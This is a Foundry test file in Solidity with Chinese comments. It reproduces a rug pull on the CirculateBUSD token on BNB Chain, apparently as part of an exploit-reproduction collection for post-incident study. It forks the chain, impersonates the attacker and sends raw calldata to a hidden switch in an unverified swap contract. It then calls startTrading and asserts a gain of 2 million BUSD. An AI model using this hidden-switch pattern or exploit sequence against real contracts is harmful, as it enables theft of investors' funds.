pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// 分析：https://www.levi104.com/categories/13-RugPull/

contract Attacker is Test {

    // 土狗合约
    ICirculateBUSD public CirculateBUSD = ICirculateBUSD(address(0x9639D76092B2ae074A7E2D13Ac030b4b6A0313ff));
    // 攻击者
    // BUSDC
    IBUSDC busdc = IBUSDC(address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56));
    address public attacker = 0x5695Ef5f2E997B2e142B38837132a6c3Ddc463b7;
    // 为开源的swap合约，开关隐藏在这
    address public swapToToken = 0x112F8834cD3dB8D2DdEd90BE6bA924a88F56Eb4b;

     function setUp() public {
        vm.createSelectFork("bsc", 24_715_926);

        vm.label(address(CirculateBUSD), "CirculateBUSD");
        vm.label(address(attacker), "attacker");
        vm.label(address(swapToToken), "swapToToken");
    }

    function test_Exploit() public {
        vm.startBroadcast(address(attacker));

        uint256 beforeAttack = busdc.balanceOf(address(attacker));
        console.log("before attacker balance:", beforeAttack);
        
        // 攻击之前得设置一下slot_7
        bytes memory data = abi.encodePacked(
            bytes4(0x4b2d25ef),
            bytes32(0x0000000000000000000000005695ef5f2e997b2e142b38837132a6c3ddc463b7),
            bytes32(0x00000000000000000000000000000000000000000001a784379d99db42000000),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000002710)
        );
        uint size = data.length;
        address x = address(swapToToken);
        assembly{
            switch call(gas(), x, 0, add(data,0x20), size, 0, 0)
            case 0 {
                   returndatacopy(0x00,0x00,returndatasize())
                   revert(0, returndatasize()) 
            }
        }

        // 发起攻击
        CirculateBUSD.startTrading(0x5695Ef5f2E997B2e142B38837132a6c3Ddc463b7, 
                            0x1a784379d99db42000000, 
                            0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

        uint256 afterAttack = busdc.balanceOf(address(attacker));
        console.log("after attacker balance:", afterAttack);

        assertEq(afterAttack, beforeAttack + 2000000000000000000000000);

        vm.stopBroadcast();
    }

}

